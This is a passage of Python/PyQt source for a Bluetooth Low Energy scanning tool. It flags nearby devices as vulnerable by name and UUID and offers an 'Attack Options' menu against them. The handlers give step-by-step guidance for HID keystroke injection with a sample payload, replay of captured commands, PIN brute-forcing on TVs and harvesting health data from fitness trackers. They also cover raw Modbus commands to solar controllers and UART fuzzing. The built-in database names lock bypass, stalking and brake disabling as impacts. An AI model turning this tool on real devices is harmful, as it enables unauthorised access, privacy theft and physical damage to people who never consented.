            self.log(f"[+] Found {paired_count} paired devices")

            # Also get connected devices
            result2 = subprocess.run(['bluetoothctl', 'devices', 'Connected'],
                                   capture_output=True, text=True, timeout=5)
            for line in result2.stdout.strip().split('\n'):
                if line.startswith('Device '):
                    parts = line.split(' ', 2)
                    if len(parts) >= 3:
                        mac = parts[1]
                        name = parts[2]
                        self.log(f"[+] System connected: {name} ({mac})")
        except Exception as e:
            self.log(f"[!] Error getting paired devices: {e}")

    def disconnect_current(self):
        """Disconnect from currently connected device"""
        if self.bt_service and self.bt_service.is_connected_persistent():
            self.log("[*] Disconnecting from current device...")
            async def do_disconnect():
                try:
                    await self.bt_service.disconnect_persistent()
                    QTimer.singleShot(0, lambda: self._update_connection_status(None))
                    self.bridge.log_signal.emit("[+] Disconnected")
                except Exception as e:
                    self.bridge.log_signal.emit(f"[!] Disconnect error: {e}")
            self._run_async(do_disconnect())
        else:
            self.log("[*] Not connected to any device")
            self._update_connection_status(None)

    def _update_connection_status(self, device_name: str = None):
        """Update the connection status indicator"""
        if device_name:
            self.connection_status.setText(f"🟢 {device_name}")
            self.connection_status.setStyleSheet("font-weight: bold; padding: 5px; color: #00ff00;")
            self.disconnect_btn.setEnabled(True)
        else:
            self.connection_status.setText("⚫ Not Connected")
            self.connection_status.setStyleSheet("font-weight: bold; padding: 5px; color: gray;")
            self.disconnect_btn.setEnabled(False)

    def _ensure_disconnected_before_connect(self, new_mac: str):
        """Disconnect from current device if connected to a different one"""
        if self.bt_service and self.bt_service.is_connected_persistent():
            current_mac = self.bt_service._persistent_mac
            if current_mac and current_mac.upper() != new_mac.upper():
                self.log(f"[*] Disconnecting from {current_mac} before connecting to {new_mac}")
                return True  # Need to disconnect first
        return False  # Can connect directly

    # Vulnerability database with details and exploit info
    VULN_DATABASE = {
        "NoAuth-Serial": {
            "name": "Unauthenticated Serial/UART",
            "severity": "HIGH",
            "description": "Device exposes serial communication (HM-10/HM-11) without authentication. "
                          "Anyone can connect and send/receive data.",
            "impact": "Full device control, data interception, command injection",
            "exploit": "Connect via FFE0/FFE1 and send commands directly",
            "attack_type": "serial_hijack"
        },
        "Vendor-UART": {
            "name": "Vendor UART Service",
            "severity": "MEDIUM",
            "description": "Custom vendor UART service detected. Often lacks proper authentication.",
            "impact": "Potential command injection, firmware manipulation",
            "exploit": "Enumerate characteristics and fuzz for command interface",
            "attack_type": "uart_fuzz"
        },
        "HID-Inject": {
            "name": "HID Keyboard/Mouse Injection",
            "severity": "CRITICAL",
            "description": "Device presents as HID (keyboard/mouse). Can inject keystrokes or mouse movements.",
            "impact": "Keystroke injection, credential theft, malware deployment",
            "exploit": "Pair and send HID reports to inject input",
            "attack_type": "hid_inject"
        },
        "IoT-Unauth": {
            "name": "Unauthenticated IoT Control",
            "severity": "HIGH",
            "description": "IoT device (lights, sensors, etc.) with no authentication required.",
            "impact": "Device control, status monitoring, network pivoting",
            "exploit": "Send control commands via vendor characteristics",
            "attack_type": "iot_control"
        },
        "IoT-Control": {
            "name": "Critical Infrastructure Control",
            "severity": "CRITICAL",
            "description": "Solar/power equipment controllable via BLE. No auth on Modbus interface.",
            "impact": "Power system manipulation, battery damage, fire risk",
            "exploit": "Send Modbus commands to control charging/load",
            "attack_type": "modbus_control"
        },
        "Replay-Attack": {
            "name": "Replay Attack Vulnerable",
            "severity": "HIGH",
            "description": "Remote control device that replays commands without challenge-response.",
            "impact": "Unlock doors, control furniture, trigger actions",
            "exploit": "Capture and replay BLE packets",
            "attack_type": "replay"
        },
        "SmartTV-Vuln": {
            "name": "Smart TV Vulnerabilities",
            "severity": "MEDIUM",
            "description": "Smart TV with BLE remote control interface. Often has PIN bypass or weak pairing.",
            "impact": "Remote control hijack, content injection, surveillance",
            "exploit": "Attempt pairing without PIN or brute-force 4-digit PIN",
            "attack_type": "tv_control"
        },
        "Data-Leak": {
            "name": "Personal Data Leakage",
            "severity": "MEDIUM",
            "description": "Fitness/health device that broadcasts or exposes personal data.",
            "impact": "Heart rate, steps, sleep data, location history exposure",
            "exploit": "Read health characteristics without pairing",
            "attack_type": "data_harvest"
        },
        "Track-Hijack": {
            "name": "Tracker Hijacking",
            "severity": "MEDIUM",
            "description": "Bluetooth tracker (Tile, AirTag) that can be cloned or hijacked.",
            "impact": "Stalking, asset tracking abuse, false location reports",
            "exploit": "Clone tracker ID or inject false location data",
            "attack_type": "tracker_clone"
        },
        "Audio-Sniff": {
            "name": "Audio Interception",
            "severity": "MEDIUM",
            "description": "Bluetooth audio device. May allow audio stream interception.",
            "impact": "Eavesdropping on calls, audio injection",
            "exploit": "Intercept A2DP/HFP streams or inject audio",
            "attack_type": "audio_mitm"
        },
        "HID-Device": {
            "name": "HID Input Device",
            "severity": "HIGH",
            "description": "Device uses HID profile for input. May accept injected reports.",
            "impact": "Keystroke injection, input spoofing",
            "exploit": "Send crafted HID reports",
            "attack_type": "hid_inject"
        },
        "Apple-Track": {
            "name": "Apple Tracking Beacon",
            "severity": "LOW",
            "description": "Apple device broadcasting FindMy/Continuity. Can be tracked.",
            "impact": "Device owner tracking, presence detection",
            "exploit": "Decode advertising data for device fingerprinting",
            "attack_type": "track_decode"
        },
        "Google-Track": {
            "name": "Google Fast Pair Device",
            "severity": "LOW",
            "description": "Google Fast Pair enabled device. Broadcasts model info.",
            "impact": "Device identification, owner profiling",
            "exploit": "Decode Fast Pair data for device info",
            "attack_type": "track_decode"
        },
        "Nordic-IoT": {
            "name": "Nordic Semiconductor IoT",
            "severity": "MEDIUM",
            "description": "Nordic nRF chip detected. Common in IoT with varying security.",
            "impact": "Depends on firmware - often has DFU vulnerabilities",
            "exploit": "Check for open DFU service, attempt firmware dump",
            "attack_type": "dfu_exploit"
        },
        "Lock-Bypass": {
            "name": "Smart Lock Bypass",
            "severity": "CRITICAL",
            "description": "Smart lock with known BLE vulnerabilities.",
            "impact": "Unauthorized physical access",
            "exploit": "Replay unlock commands or brute-force PIN",
            "attack_type": "lock_bypass"
        },
        "Lock-Vuln?": {
            "name": "Potential Lock Vulnerability",
            "severity": "MEDIUM",
            "description": "Device name suggests lock/door. Needs investigation.",
            "impact": "Potential unauthorized access if vulnerable",
            "exploit": "Interrogate and analyze security mechanisms",
            "attack_type": "lock_investigate"
        },
        "Vehicle-Ctrl": {
            "name": "Vehicle Control",
            "severity": "CRITICAL",
            "description": "E-bike/scooter with BLE control. Often minimal security.",
            "impact": "Vehicle theft, speed limit bypass, brake disable",
            "exploit": "Send control commands to motor controller",
            "attack_type": "vehicle_control"
        },
        "Microsoft-HID": {
            "name": "Microsoft HID Device",
            "severity": "MEDIUM",
            "description": "Microsoft BLE device (keyboard/mouse). May have pairing weaknesses.",
            "impact": "Input injection if pairing bypassed",
            "exploit": "Attempt MouseJack-style attacks",
            "attack_type": "hid_inject"
        },
    }

    def _detect_vulnerabilities(self, device: DeviceData) -> list:
        """Detect potential vulnerabilities in a BLE device"""
        vulns = []
        name = (device.name or "").upper()
        service_uuids = [s.lower() for s in (device.service_uuids or [])]

        # Check for insecure serial/UART services (no auth)
        for uuid in service_uuids:
            if 'ffe0' in uuid:  # HM-10/HM-11 Serial
                vulns.append("NoAuth-Serial")
            if 'fff0' in uuid:  # Generic vendor UART
                vulns.append("Vendor-UART")
            if '1812' in uuid:  # HID - keyboard/mouse injection
                vulns.append("HID-Inject")
            if '180f' in uuid and 'ffe0' in ' '.join(service_uuids):
                vulns.append("IoT-Unauth")

        # Check device name patterns for known vulnerable devices
        vuln_patterns = {
            "HM-10": "NoAuth-Serial",
            "HM-11": "NoAuth-Serial",
            "HC-05": "NoAuth-Serial",
            "HC-06": "NoAuth-Serial",
            "BT05": "NoAuth-Serial",
            "JDY-": "NoAuth-Serial",
            "MLT-BT": "NoAuth-Serial",
            "CC254": "NoAuth-Serial",
            "ITAG": "NoAuth-Tracker",
            "TILE": "Track-Hijack",
            "AIRTAG": "Track-Hijack",
            "GOVEE": "IoT-Unauth",
            "GVH": "IoT-Unauth",
            "IHOMENT": "IoT-Unauth",
            "LCIREMOTE": "Replay-Attack",
            "SWITCHBOT": "IoT-Unauth",
            "YEELIGHT": "IoT-Unauth",
            "XIAOMI": "IoT-Leak",
            "MI_SCALE": "Data-Leak",
            "MIBAND": "Data-Leak",
            "FITBIT": "Data-Leak",
            "SMARTLOCK": "Lock-Bypass",
            "LOCK": "Lock-Vuln?",
            "DOOR": "Lock-Vuln?",
            "MPPT": "IoT-Control",
            "GP-RVC": "IoT-Control",
            "RENOGY": "IoT-Control",
            "INVERTER": "IoT-Control",
            "EBIKE": "Vehicle-Ctrl",
            "SCOOTER": "Vehicle-Ctrl",
            "KS03": "HID-Inject",  # Keyboard
            "KEYBOARD": "HID-Inject",
            "MOUSE": "HID-Inject",
            "NOISE": "Audio-Sniff",
            "[TV]": "SmartTV-Vuln",
            "SAMSUNG": "SmartTV-Vuln",
            "LG_TV": "SmartTV-Vuln",
            "ROKU": "SmartTV-Vuln",
        }

        for pattern, vuln in vuln_patterns.items():
            if pattern in name and vuln not in vulns:
                vulns.append(vuln)

        # Check manufacturer ID for known vulnerable chips
        if device.manufacturer_id:
            vuln_manufacturers = {
                76: "Apple-Track",      # Apple (AirTag tracking)
                6: "Microsoft-HID",     # Microsoft (HID attacks)
                224: "Google-Track",    # Google (Fast Pair tracking)
                496: "HID-Device",      # Common HID manufacturer
                89: "Nordic-IoT",       # Nordic Semi (often insecure IoT)
            }
            if device.manufacturer_id in vuln_manufacturers:
                v = vuln_manufacturers[device.manufacturer_id]
                if v not in vulns:
                    vulns.append(v)

        return vulns

    def _add_device_to_tree(self, device: DeviceData):
        """Add or update discovered device in tree widget (dedupe by MAC)"""
        mac = device.mac_address

        # Check if device already exists in tree
        existing_item = None
        for i in range(self.devices_tree.topLevelItemCount()):
            item = self.devices_tree.topLevelItem(i)
            if item.data(0, Qt.ItemDataRole.UserRole) == mac:
                existing_item = item
                break

        # Count advertised services
        svc_count = len(device.service_uuids) if device.service_uuids else 0

        # Detect vulnerabilities
        vulns = self._detect_vulnerabilities(device)
        vuln_str = ", ".join(vulns) if vulns else "-"
        vuln_count = len(vulns)

        if existing_item:
            # Update existing item with latest data
            existing_item.setText(0, device.name or "Unknown")
            existing_item.setText(2, f"{device.rssi}" if device.rssi else "N/A")
            existing_item.setText(3, str(svc_count))
            existing_item.setText(4, vuln_str)
            existing_item.setData(2, Qt.ItemDataRole.UserRole, device.rssi if device.rssi else -999)
            existing_item.setData(3, Qt.ItemDataRole.UserRole, svc_count)
            existing_item.setData(4, Qt.ItemDataRole.UserRole, vuln_count)
            # Update stored device data
            self.discovered_devices[mac] = device
            # Color entire row if vulnerable
            if vuln_count > 0:
                for col in range(5):
                    existing_item.setBackground(col, QColor(80, 0, 0))  # Dark red bg
                    existing_item.setForeground(col, QColor(255, 100, 100))  # Light red text
                existing_item.setForeground(4, QColor(255, 50, 50))  # Bright red vulns
            return

        # Add new device
        self.discovered_devices[mac] = device

        item = SortableTreeWidgetItem([
            device.name or "Unknown",
            mac,
            f"{device.rssi}" if device.rssi else "N/A",
            str(svc_count),
            vuln_str
        ])
        item.setData(0, Qt.ItemDataRole.UserRole, mac)
        # Store numeric values for proper sorting
        item.setData(2, Qt.ItemDataRole.UserRole, device.rssi if device.rssi else -999)
        item.setData(3, Qt.ItemDataRole.UserRole, svc_count)
        item.setData(4, Qt.ItemDataRole.UserRole, vuln_count)

        # Color row based on vulnerability
        if vuln_count > 0:
            for col in range(5):
                item.setBackground(col, QColor(80, 0, 0))  # Dark red background
                item.setForeground(col, QColor(255, 150, 150))  # Light red text
            item.setForeground(4, QColor(255, 50, 50))  # Bright red for vulns column
        else:
            # Default coloring - just RSSI
            if device.rssi:
                if device.rssi > -50:
                    item.setForeground(2, QColor(0, 200, 0))  # Strong
                elif device.rssi > -70:
                    item.setForeground(2, QColor(200, 200, 0))  # Medium
                else:
                    item.setForeground(2, QColor(200, 100, 0))  # Weak

        self.devices_tree.addTopLevelItem(item)

    def on_device_selected(self, item: QTreeWidgetItem, column: int):
        """Handle single click on device - update panels based on device type"""
        if not item:
            return

        mac = item.data(0, Qt.ItemDataRole.UserRole)
        if not mac or mac not in self.discovered_devices:
            return

        device = self.discovered_devices[mac]
        self.current_device = device

        # Update panels based on device name/type (without full interrogation)
        self._detect_known_services(device)

        self.log(f"[*] Selected: {device.name or 'Unknown'} ({mac})")

    def on_device_double_click(self, item: QTreeWidgetItem, column: int):
        """Handle double-click on device - start interrogation"""
        self.interrogate_selected_device()

    def interrogate_selected_device(self):
        """Connect to and interrogate the selected device"""
        item = self.devices_tree.currentItem()
        if not item:
            QMessageBox.warning(self, "No Device", "Please select a device first.")
            return

        mac = item.data(0, Qt.ItemDataRole.UserRole)
        if not mac:
            return

        self.log(f"[*] Starting interrogation of {mac}...")
        self.progress_label.setText(f"Connecting to {mac}...")
        self.interrogate_btn.setEnabled(False)

        async def do_interrogate():
            try:
                def progress(msg):
                    self.bridge.progress_signal.emit(msg)

                device_data = await self.bt_service.connect_and_interrogate(
                    mac,
                    read_values=True,
                    progress_callback=progress
                )
                self.bridge.interrogation_complete_signal.emit(device_data)
            except Exception as e:
                self.bridge.log_signal.emit(f"[!] Interrogation error: {e}")
                self.bridge.interrogation_complete_signal.emit(None)

        self._run_async(do_interrogate())

    def _on_interrogation_complete(self, device_data: Optional[DeviceData]):
        """Handle interrogation completion"""
        self.interrogate_btn.setEnabled(True)

        if not device_data:
            self.progress_label.setText("Interrogation failed")
            return

        self.current_device = device_data
        self.progress_label.setText(f"Interrogated: {len(device_data.services)} services")

        # Populate GATT tree
        self.gatt_tree.clear()

        for service in device_data.services:
            svc_item = QTreeWidgetItem([
                f"[Service] {service.name}",
                service.uuid_short,
                "",
                ""
            ])
            svc_item.setData(0, Qt.ItemDataRole.UserRole, ("service", service))
            svc_item.setExpanded(True)
            svc_item.setForeground(0, QColor(100, 150, 255))

            for char in service.characteristics:
                props_str = ", ".join(char.properties)
                value_str = char.value_decoded[:50] if char.value_decoded else ""

                char_item = QTreeWidgetItem([
                    f"  [Char] {char.name}",
                    char.uuid_short,
                    props_str,
                    value_str
                ])
                char_item.setData(0, Qt.ItemDataRole.UserRole, ("characteristic", char, service))

                # Color by properties
                if char.can_write:
                    char_item.setForeground(0, QColor(255, 200, 100))
                elif char.can_notify:
                    char_item.setForeground(0, QColor(100, 255, 100))

                for desc in char.descriptors:
                    desc_item = QTreeWidgetItem([
                        f"    [Desc] {desc.name}",
                        desc.uuid_short,
                        "",
                        desc.value_decoded[:30] if desc.value_decoded else ""
                    ])
                    desc_item.setData(0, Qt.ItemDataRole.UserRole, ("descriptor", desc))
                    char_item.addChild(desc_item)

                svc_item.addChild(char_item)

            self.gatt_tree.addTopLevelItem(svc_item)

        # Update JSON view
        if self.bt_service:
            json_str = self.bt_service.export_device_json(device_data)
            self.json_view.setText(json_str)

        # Enable export buttons
        self.export_btn.setEnabled(True)
        self.generate_btn.setEnabled(True)

        # Detect and enable known service controls
        self._detect_known_services(device_data)

        self.log(f"[+] Interrogation complete: {len(device_data.services)} services found")

    def on_gatt_item_clicked(self, item: QTreeWidgetItem, column: int):
        """Handle click on GATT tree item"""
        data = item.data(0, Qt.ItemDataRole.UserRole)
        if not data:
            return

        item_type = data[0]

        if item_type == "characteristic":
            char = data[1]
            service = data[2]

            info = f"""Characteristic: {char.name}
UUID: {char.uuid}
Short UUID: {char.uuid_short}
Handle: {char.handle}

Properties: {', '.join(char.properties)}
  Can Read: {char.can_read}
  Can Write: {char.can_write}
  Can Write (no response): {char.can_write_no_response}
  Can Notify: {char.can_notify}
  Can Indicate: {char.can_indicate}

Service: {service.name}
Service UUID: {service.uuid}

Last Value (hex): {char.value_hex or 'N/A'}
Decoded: {char.value_decoded or 'N/A'}

Descriptors: {len(char.descriptors)}
"""
            for desc in char.descriptors:
                info += f"  - {desc.name}: {desc.value_decoded or 'N/A'}\n"

            self.char_info.setText(info)

            # Enable appropriate buttons
            self.read_btn.setEnabled(char.can_read)
            self.write_btn.setEnabled(char.can_write or char.can_write_no_response)
            self.notify_btn.setEnabled(char.can_notify or char.can_indicate)

            # Store current characteristic for operations
            self._current_char = char
            self._current_service = service

        elif item_type == "service":
            service = data[1]
            info = f"""Service: {service.name}
UUID: {service.uuid}
Short UUID: {service.uuid_short}
Handle: {service.handle_start}

Characteristics: {len(service.characteristics)}
"""
            for char in service.characteristics:
                info += f"  - {char.name} [{', '.join(char.properties)}]\n"

            self.char_info.setText(info)
            self.read_btn.setEnabled(False)
            self.write_btn.setEnabled(False)
            self.notify_btn.setEnabled(False)

        elif item_type == "descriptor":
            desc = data[1]
            info = f"""Descriptor: {desc.name}
UUID: {desc.uuid}
Handle: {desc.handle}

Value (hex): {desc.value_hex or 'N/A'}
Decoded: {desc.value_decoded or 'N/A'}
"""
            self.char_info.setText(info)

    def read_selected_characteristic(self):
        """Read the selected characteristic"""
        if not hasattr(self, '_current_char') or not self.current_device:
            return

        char = self._current_char
        mac = self.current_device.mac_address

        self.log(f"[*] Reading {char.name}...")

        async def do_read():
            try:
                value = await self.bt_service.read_characteristic(mac, char.uuid)
                if value:
                    decoded = self.bt_service.decode_value(value)
                    self.bridge.log_signal.emit(f"[+] Read: {value.hex()} = {decoded}")
            except Exception as e:
                self.bridge.log_signal.emit(f"[!] Read error: {e}")

        self._run_async(do_read())

    def write_selected_characteristic(self):
        """Write to the selected characteristic"""
        if not hasattr(self, '_current_char') or not self.current_device:
            return

        char = self._current_char
        mac = self.current_device.mac_address
        input_text = self.write_input.text().strip()
        write_type = self.write_type.currentText()

        if not input_text:
            QMessageBox.warning(self, "No Value", "Please enter a value to write.")
            return

        # Convert input to bytes
        try:
            if write_type == "Hex":
                value = bytes.fromhex(input_text.replace(" ", ""))
            elif write_type == "UTF-8":
                value = input_text.encode('utf-8')
            elif write_type == "Int (LE)":
                num = int(input_text)
                value = num.to_bytes((num.bit_length() + 7) // 8 or 1, 'little')
            elif write_type == "Int (BE)":
                num = int(input_text)
                value = num.to_bytes((num.bit_length() + 7) // 8 or 1, 'big')
            else:
                value = bytes.fromhex(input_text)
        except Exception as e:
            QMessageBox.warning(self, "Invalid Value", f"Could not parse value: {e}")
            return

        self.log(f"[*] Writing {value.hex()} to {char.name}...")

        async def do_write():
            try:
                success = await self.bt_service.write_characteristic(
                    mac, char.uuid, value, with_response=char.can_write
                )
                if success:
                    self.bridge.log_signal.emit(f"[+] Write successful")
                else:
                    self.bridge.log_signal.emit(f"[!] Write failed")
            except Exception as e:
                self.bridge.log_signal.emit(f"[!] Write error: {e}")

        self._run_async(do_write())

    def subscribe_notifications(self):
        """Subscribe to notifications from the selected characteristic"""
        if not hasattr(self, '_current_char') or not self.current_device:
            return

        char = self._current_char
        mac = self.current_device.mac_address

        self.log(f"[*] Subscribing to {char.name} notifications...")

        def notification_callback(uuid: str, data: bytes):
            decoded = self.bt_service.decode_value(data) if self.bt_service else data.hex()
            self.bridge.log_signal.emit(f"[Notify] {uuid}: {data.hex()} = {decoded}")

        async def do_subscribe():
            try:
                await self.bt_service.subscribe_notifications(
                    mac, char.uuid, notification_callback, duration=30.0
                )
            except Exception as e:
                self.bridge.log_signal.emit(f"[!] Notification error: {e}")

        self._run_async(do_subscribe())

    def show_device_context_menu(self, position):
        """Show context menu for device list"""
        item = self.devices_tree.itemAt(position)
        if not item:
            return

        mac = item.data(0, Qt.ItemDataRole.UserRole)
        device = self.discovered_devices.get(mac)
        vulns = self._detect_vulnerabilities(device) if device else []

        menu = QMenu(self)

        interrogate_action = QAction("🔍 Interrogate Device", self)
        interrogate_action.triggered.connect(self.interrogate_selected_device)
        menu.addAction(interrogate_action)

        # Vulnerability section
        if vulns:
            menu.addSeparator()
            vuln_menu = menu.addMenu(f"⚠️ Vulnerabilities ({len(vulns)})")

            for vuln in vulns:
                vuln_info = self.VULN_DATABASE.get(vuln, {})
                severity = vuln_info.get("severity", "UNKNOWN")
                sev_icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🟢"}.get(severity, "⚪")

                # Show vuln details action
                details_action = QAction(f"{sev_icon} {vuln}: Details", self)
                details_action.triggered.connect(lambda checked, v=vuln: self._show_vuln_details(v))
                vuln_menu.addAction(details_action)

            vuln_menu.addSeparator()

            # Show all vulns action
            all_vulns_action = QAction("📋 Show All Vulnerability Details", self)
            all_vulns_action.triggered.connect(lambda: self._show_all_vuln_details(vulns))
            vuln_menu.addAction(all_vulns_action)

            # Attack menu
            menu.addSeparator()
            attack_menu = menu.addMenu("⚔️ Attack Options")

            # Add attack options based on vulnerabilities
            attack_types_added = set()
            for vuln in vulns:
                vuln_info = self.VULN_DATABASE.get(vuln, {})
                attack_type = vuln_info.get("attack_type")
                if attack_type and attack_type not in attack_types_added:
                    attack_types_added.add(attack_type)
                    attack_name = vuln_info.get("name", vuln)
                    attack_action = QAction(f"🎯 {attack_name}", self)
                    attack_action.triggered.connect(
                        lambda checked, at=attack_type, d=device: self._launch_attack(at, d)
                    )
                    attack_menu.addAction(attack_action)

            if not attack_types_added:
                no_attack = QAction("No automated attacks available", self)
                no_attack.setEnabled(False)
                attack_menu.addAction(no_attack)

        menu.addSeparator()

        copy_mac_action = QAction("📋 Copy MAC Address", self)
        copy_mac_action.triggered.connect(lambda: self._copy_to_clipboard(mac))
        menu.addAction(copy_mac_action)

        copy_name_action = QAction("📋 Copy Device Name", self)
        copy_name_action.triggered.connect(lambda: self._copy_to_clipboard(item.text(0)))
        menu.addAction(copy_name_action)

        menu.exec(self.devices_tree.viewport().mapToGlobal(position))

    def _show_vuln_details(self, vuln_id: str):
        """Show detailed vulnerability information"""
        vuln_info = self.VULN_DATABASE.get(vuln_id, {})
        if not vuln_info:
            return

        severity = vuln_info.get("severity", "UNKNOWN")
        sev_colors = {"CRITICAL": "#ff0000", "HIGH": "#ff8800", "MEDIUM": "#ffff00", "LOW": "#00ff00"}
        sev_color = sev_colors.get(severity, "#ffffff")

        msg = QMessageBox(self)
        msg.setWindowTitle(f"Vulnerability: {vuln_id}")
        msg.setIcon(QMessageBox.Icon.Warning)
        msg.setText(f"""<h2 style="color: {sev_color}">{vuln_info.get('name', vuln_id)}</h2>
<p><b>Severity:</b> <span style="color: {sev_color}">{severity}</span></p>
<p><b>Description:</b><br>{vuln_info.get('description', 'No description')}</p>
<p><b>Impact:</b><br>{vuln_info.get('impact', 'Unknown impact')}</p>
<p><b>Exploitation:</b><br>{vuln_info.get('exploit', 'No exploit info')}</p>
""")
        msg.exec()

    def _show_all_vuln_details(self, vulns: list):
        """Show all vulnerability details for a device"""
        html = "<h2>Detected Vulnerabilities</h2>"
        sev_colors = {"CRITICAL": "#ff0000", "HIGH": "#ff8800", "MEDIUM": "#ffff00", "LOW": "#00ff00"}

        for vuln_id in vulns:
            vuln_info = self.VULN_DATABASE.get(vuln_id, {})
            severity = vuln_info.get("severity", "UNKNOWN")
            sev_color = sev_colors.get(severity, "#ffffff")

            html += f"""
<div style="margin-bottom: 15px; padding: 10px; border: 1px solid {sev_color};">
<h3 style="color: {sev_color}">{vuln_info.get('name', vuln_id)}</h3>
<p><b>Severity:</b> <span style="color: {sev_color}">{severity}</span></p>
<p><b>Description:</b> {vuln_info.get('description', 'N/A')}</p>
<p><b>Impact:</b> {vuln_info.get('impact', 'N/A')}</p>
<p><b>Exploit:</b> {vuln_info.get('exploit', 'N/A')}</p>
</div>
"""

        msg = QMessageBox(self)
        msg.setWindowTitle("Vulnerability Report")
        msg.setIcon(QMessageBox.Icon.Warning)
        msg.setText(html)
        msg.setMinimumWidth(500)
        msg.exec()

    def _launch_attack(self, attack_type: str, device: DeviceData):
        """Launch an attack against a device"""
        if not device:
            return

        self.log(f"[*] Launching {attack_type} attack on {device.name or device.mac_address}")

        if attack_type == "serial_hijack":
            self._attack_serial_hijack(device)
        elif attack_type == "hid_inject":
            self._attack_hid_inject(device)
        elif attack_type == "iot_control":
            self._attack_iot_control(device)
        elif attack_type == "modbus_control":
            self._attack_modbus_control(device)
        elif attack_type == "replay":
            self._attack_replay_capture(device)
        elif attack_type == "tv_control":
            self._attack_tv_control(device)
        elif attack_type == "data_harvest":
            self._attack_data_harvest(device)
        elif attack_type == "uart_fuzz":
            self._attack_uart_fuzz(device)
        else:
            QMessageBox.information(
                self, "Attack Not Implemented",
                f"Attack type '{attack_type}' is not yet implemented.\n\n"
                f"Target: {device.name or device.mac_address}\n"
                f"MAC: {device.mac_address}"
            )

    def _attack_serial_hijack(self, device: DeviceData):
        """Serial hijack attack - connect to HM-10 and listen"""
        self.log(f"[ATTACK] Serial Hijack on {device.mac_address}")
        # Store as current device and go to Known Services tab
        self.current_device = device
        self.detail_tabs.setCurrentIndex(3)  # Known Services tab
        self.hm10_send_btn.setEnabled(True)
        self.hm10_subscribe_btn.setEnabled(True)
        self.hm10_input.setEnabled(True)
        self.log("[*] Use HM-10 controls to send/receive serial data")
        QMessageBox.information(
            self, "Serial Hijack",
            f"Device: {device.name}\nMAC: {device.mac_address}\n\n"
            "Use the HM-10 controls in the Known Services tab to:\n"
            "1. Click 'Subscribe to Notifications' to listen\n"
            "2. Type commands and click 'Send' to inject\n\n"
            "Common commands to try:\n"
            "• AT (should return OK)\n"
            "• AT+VERSION\n"
            "• AT+NAME"
        )

    def _attack_hid_inject(self, device: DeviceData):
        """HID injection attack placeholder"""
        self.log(f"[ATTACK] HID Inject on {device.mac_address}")
        QMessageBox.information(
            self, "HID Injection Attack",
            f"Target: {device.name}\nMAC: {device.mac_address}\n\n"
            "HID Injection allows sending keystrokes/mouse input.\n\n"
            "Requirements:\n"
            "1. Device must accept pairing\n"
            "2. Send HID reports to characteristic 0x2A4D\n\n"
            "Implementation: Interrogate device, find HID Report char,\n"
            "then craft HID reports for keystroke injection.\n\n"
            "Example payload (type 'a'):\n"
            "00 00 04 00 00 00 00 00"
        )

    def _attack_iot_control(self, device: DeviceData):
        """IoT control attack - enumerate and control"""
        self.log(f"[ATTACK] IoT Control on {device.mac_address}")
        self.interrogate_selected_device()
        QMessageBox.information(
            self, "IoT Control Attack",
            f"Target: {device.name}\nMAC: {device.mac_address}\n\n"
            "Interrogating device to find control characteristics...\n\n"
            "After interrogation:\n"
            "1. Look for writable characteristics in GATT tree\n"
            "2. Common IoT commands:\n"
            "   • Power: 01 = ON, 00 = OFF\n"
            "   • Brightness: 00-FF (0-255)\n"
            "   • Color: RGB values\n\n"
            "Use the Characteristic tab to write values."
        )

    def _attack_modbus_control(self, device: DeviceData):
        """Modbus control attack for MPPT/inverters"""
        self.log(f"[ATTACK] Modbus Control on {device.mac_address}")
        self.current_device = device
        self._detect_known_services(device)
        self.detail_tabs.setCurrentIndex(3)  # Known Services tab
        QMessageBox.information(
            self, "Modbus Control Attack",
            f"Target: {device.name}\nMAC: {device.mac_address}\n\n"
            "Use the GP-RVC MPPT controller panel to:\n"
            "1. Click 'Connect & Subscribe'\n"
            "2. Use status buttons to query device\n"
            "3. Use 'Send Raw' for custom Modbus commands\n\n"
            "⚠️ WARNING: Improper commands can damage\n"
            "batteries or solar equipment!"
        )

    def _attack_replay_capture(self, device: DeviceData):
        """Replay attack - capture and replay commands"""
        self.log(f"[ATTACK] Replay Capture on {device.mac_address}")
        QMessageBox.information(
            self, "Replay Attack",
            f"Target: {device.name}\nMAC: {device.mac_address}\n\n"
            "To perform a replay attack:\n\n"
            "1. Start btmon in terminal:\n"
            "   sudo btmon -w capture.btsnoop\n\n"
            "2. Trigger the action on the original device\n"
            "   (e.g., press button on remote)\n\n"
            "3. Analyze capture for the command packet\n\n"
            "4. Replay using gatttool or this app's\n"
            "   characteristic write feature"
        )

    def _attack_tv_control(self, device: DeviceData):
        """Smart TV control attack"""
        self.log(f"[ATTACK] TV Control on {device.mac_address}")
        self.interrogate_selected_device()
        QMessageBox.information(
            self, "Smart TV Attack",
            f"Target: {device.name}\nMAC: {device.mac_address}\n\n"
            "Smart TV attack vectors:\n\n"
            "1. BLE Remote Hijack:\n"
            "   - Pair as remote control\n"
            "   - Send input commands\n\n"
            "2. PIN Brute Force:\n"
            "   - Try 0000, 1234, 1111, etc.\n\n"
            "3. After pairing:\n"
            "   - Look for HID or vendor services\n"
            "   - Inject navigation/input commands"
        )

    def _attack_data_harvest(self, device: DeviceData):
        """Harvest data from fitness/health devices"""
        self.log(f"[ATTACK] Data Harvest on {device.mac_address}")
        self.interrogate_selected_device()
        QMessageBox.information(
            self, "Data Harvest Attack",
            f"Target: {device.name}\nMAC: {device.mac_address}\n\n"
            "Interrogating to find readable characteristics...\n\n"
            "Look for these standard health UUIDs:\n"
            "• 0x2A37 - Heart Rate\n"
            "• 0x2A19 - Battery Level\n"
            "• 0x2A53 - RSC Measurement (running)\n"
            "• 0x2A5B - CSC Measurement (cycling)\n"
            "• 0x2A9D - Weight Measurement\n\n"
            "Read these to extract personal data."
        )

    def _attack_uart_fuzz(self, device: DeviceData):
        """UART fuzzing attack"""
        self.log(f"[ATTACK] UART Fuzz on {device.mac_address}")
        self.interrogate_selected_device()
        QMessageBox.information(
            self, "UART Fuzzing Attack",
            f"Target: {device.name}\nMAC: {device.mac_address}\n\n"
            "UART Fuzzing steps:\n\n"
            "1. Interrogate and find vendor UART service\n"
            "2. Identify TX (write) characteristic\n"
            "3. Send test payloads:\n"
            "   • 00 00 00 00\n"
            "   • FF FF FF FF\n"
            "   • AT\\r\\n\n"
            "   • admin\\r\\n\n"
            "   • ?\\r\\n\n"
            "   • help\\r\\n\n\n"
            "4. Monitor responses for command syntax"
        )

    def show_gatt_context_menu(self, position):
        """Show context menu for GATT tree"""
        item = self.gatt_tree.itemAt(position)
        if not item:
            return

        data = item.data(0, Qt.ItemDataRole.UserRole)
        if not data:
            return

        menu = QMenu(self)

